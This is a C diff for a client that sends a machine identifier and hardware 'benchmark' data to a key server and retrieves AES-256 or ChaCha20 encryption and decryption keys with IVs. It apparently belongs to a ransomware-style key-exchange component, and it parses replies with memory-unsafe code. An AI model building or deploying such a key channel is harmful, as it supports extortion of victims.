@@ -66,16 +66,16 @@ static char* json_body(char* p_identifier, benchmarkData* p_data, char* p_struct
         sprintf(p_body, "{\n\"identifier\": \"%s\",\n", p_identifier);
 
         /* Add the benchmark data */
-        sprintf(p_tmp, "\"%s\": {\n\t\"dataSize\": %d,\n\t", p_structKey, p_data->dataSize);
+        sprintf(p_tmp, "\"%s\": {\n\t\"dataSize\": %ld,\n\t", p_structKey, p_data->dataSize);
         strcat(p_body, p_tmp);
 
-        sprintf(p_tmp, "\"cpuCore\": %d,\n\t", p_data->cpuCore);
+        sprintf(p_tmp, "\"cpuCores\": %d,\n\t", p_data->cpuCore);
         strcat(p_body, p_tmp);
 
-        sprintf(p_tmp, "\"cpuMinFreq\": %f,\n\t", p_data->cpuMinFreq);
+        sprintf(p_tmp, "\"cpuMinFreq\": %d,\n\t", p_data->cpuMinFreq);
         strcat(p_body, p_tmp);
 
-        sprintf(p_tmp, "\"cpuMaxFreq\": %f,\n\t", p_data->cpuMaxFreq);
+        sprintf(p_tmp, "\"cpuMaxFreq\": %d,\n\t", p_data->cpuMaxFreq);
         strcat(p_body, p_tmp);
 
         sprintf(p_tmp, "\"memorySize\": %d\n\t}\n", p_data->memorySize);
@@ -103,49 +103,42 @@ static char* format_request(char* p_url, char* p_host, char* p_endpoint, char* p
     return p_request;
 }
 
-static char* process_response(char* p_response) {
-    size_t key_length = 0;
-    char* key = NULL;
-    const char *begin_marker = "-----BEGIN";
+static char* extract_value(const char* p_json, char* p_key) {
+    char *p_keyPos = strstr(p_json, p_key);
+    char* p_value = NULL;
+    if (p_keyPos) {
+        char *start = strchr(p_keyPos, ':');
+        if (start) {
+            start += 2; // Ignorer ": "
+            char *end = strchr(start, '"');
+            if (end) {
+                size_t length = end - start;
+                p_value = (char*)malloc(length + 1);
+                strncpy(p_value, start, length);
+                p_value[length] = '\0';
+            }
+        }
+    }
 
-    /* Find start and end pem marker */
-    const char* begin = strstr(p_response, begin_marker);
+    return p_value;
+}
 
-    if (begin) {
-        /* Compute the length of the key */
-        key_length = strlen(begin);
-        key = (char*)malloc(key_length + 1);
-        /* Copy the key */
-        strncpy(key, begin, key_length);
-        key[key_length] = '\0';  // End the string
-        printf("[+] Public key found in response.\n");
-        //printf("Key:\n%s\n", key);
-        return key;
+static char* extract_json_body(const char* p_response) {
+    const char *body_start = strstr(p_response, "\r\n\r\n");
+    char* json_body = (char*)malloc(RESPONSE_SIZE);
+
+    if (body_start) {
+        body_start += 4; // Ignore "\r\n\r\n"
+        strcpy(json_body, body_start);
     } else {
-        perror("[-] Public key markers not found in response.\n");
+        perror("[-] ERROR extracting json body");
         exit(1);
     }
+
+    return json_body;
 }
 
-static void save_key(char* p_key, char* p_filename) {
-    FILE *p_f = fopen(p_filename, "w");
-    if (p_f == NULL)
-    {
-        perror("[-] Error opening file.\n");
-        exit(1);
-    }
-
-    if (fprintf(p_f, "%s", p_key) < 0) {
-        perror("[-] ERROR writing to file");
-        fclose(p_f);
-        exit(1);
-    }
-
-    fclose(p_f);
-    printf("[+] Key saved to %s\n", p_filename);
-}
-
-static void get_key(char* p_identifier, char* p_key_name, char* p_endpoint, char* p_api_url, char* p_host, int p_port) {
+static char* contact_server(char* p_identifier, benchmarkData* p_data, char* p_structKey, char* p_endpoint, char* p_api_url, char* p_host, int p_port) {
 
     int sent = 0;
     int received = 0;
@@ -160,9 +153,8 @@ static void get_key(char* p_identifier, char* p_key_name, char* p_endpoint, char
     char* p_message = NULL;
     char* p_response = NULL;
     char* p_body = NULL;
-    char* p_key = NULL;
 
-    p_body = json_body(p_identifier, NULL, NULL);
+    p_body = json_body(p_identifier, p_data, p_structKey);
     p_message = format_request(p_api_url, p_host, p_endpoint, p_body);
 
     //printf("Request:\n%s\n", p_message);
@@ -205,29 +197,92 @@ static void get_key(char* p_identifier, char* p_key_name, char* p_endpoint, char
         exit(1);
     }
 
-    /* Process response */
-    p_key = process_response(p_response);
-    //printf("Response:\n%s\n", p_key);
+    printf("[+] Response received\n");
 
     /* Save the key to a file */
-    save_key(p_key, p_key_name);
+    //if (p_key_name != NULL)
+    //{
+    //    save_key(p_key, p_key_name);
+    //}
 
     /* Free memory */
-    free(p_key);
-    p_key = NULL;
     free(p_message);
     p_message = NULL;
     free(p_body);
     p_body = NULL;
+
+    return p_response; 
+}
+
+char* get_encryption_key(char* p_identifier, benchmarkData* p_data, char** p_algo, char** p_iv) {
+    char* p_response = contact_server(p_identifier, p_data, "benchmark", GET_ENC_KEY_ENDPOINT, API_URL, KEY_HOST, KEY_PORT);
+
+    char* json_body = extract_json_body(p_response);
+
+    /* Get key value */
+    *p_algo = extract_value(p_response, "algorithm");
+
+    char* p_key = extract_value(json_body, "encryptKey");
+
+    if (*p_algo != NULL )
+    {
+        if (strcmp(*p_algo, "AES-256") == 0)
+        {
+            *p_iv = extract_value(json_body, "iv");
+        } else if (strcmp(*p_algo, "CHACHA20") == 0)
+        {
+            *p_iv = extract_value(json_body, "nonce");
+        }
+    }
+
+    free(json_body);
     free(p_response);
-    p_response = NULL;
 
+    return p_key;
 }
 
-void get_encryption_key(char* p_identifier) {
-    get_key(p_identifier, ENC_KEY_NAME, GET_ENC_KEY_ENDPOINT, API_URL, KEY_HOST, KEY_PORT);
+char* get_decryption_key(char* p_identifier, char** p_algo, char** p_iv) {
+    char* p_response = contact_server(p_identifier, NULL, NULL, GET_DEC_KEY_ENDPOINT, API_URL, KEY_HOST, KEY_PORT);
+
+    char* json_body = extract_json_body(p_response);
+
+    /* Get key value */
+    *p_algo = extract_value(p_response, "algorithm");
+
+    char* p_key = extract_value(json_body, "decryptKey");
+
+    if (strcmp(*p_algo, "AES-256") == 0)
+    {
+        *p_iv = extract_value(json_body, "iv");
+    } else if (strcmp(*p_algo, "CHACHA20") == 0)
+    {
+        *p_iv = extract_value(json_body, "nonce");
+    }
+
+    free(json_body);
+    free(p_response);
+
+    return p_key;
 }
 
-void get_decryption_key(char* p_identifier) {
-    get_key(p_identifier, DEC_KEY_NAME, GET_DEC_KEY_ENDPOINT, API_URL, KEY_HOST, KEY_PORT);
+void save_key(char* p_key, char* p_filename) {
+    FILE *p_f = fopen(p_filename, "w");
+    if (p_f == NULL) {
+        perror("[-] Error opening file.\n");
+        exit(1);
+    }
+
+    const char *ptr = p_key;
+    while (*ptr) {
+        if (*ptr == '\\' && *(ptr + 1) == 'n') {
+            fputc('\n', p_f);
+            ptr += 2;
+        } else {
+            fputc(*ptr, p_f);
+            ptr++;
+        }
+    }
+
+    fclose(p_f);
+    printf("[+] Key saved to %s\n", p_filename);
 }
